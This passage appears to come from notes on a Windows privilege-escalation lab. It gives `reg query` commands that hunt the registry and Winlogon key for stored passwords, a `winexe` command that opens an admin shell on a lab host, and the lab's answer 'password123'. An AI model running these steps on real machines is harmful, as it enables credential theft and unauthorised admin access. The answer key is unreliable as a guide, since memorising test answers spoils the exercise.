(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: password123)  

The registry can be searched for keys and values that contain the word "password":

```
reg query HKLM /f password /t REG_SZ /s
```

![[Pasted image 20240528194336.png]]


If you want to save some time, query this specific key to find admin AutoLogon credentials:

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

![[Pasted image 20240528194422.png]]


On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

```
winexe -U 'admin%password' //10.10.212.141 cmd.exe
```

![[Pasted image 20240528194616.png]]


Answer the questions below

| Question                                               | Answer      |
| ------------------------------------------------------ | ----------- |
| What was the admin password you found in the registry? | password123 |
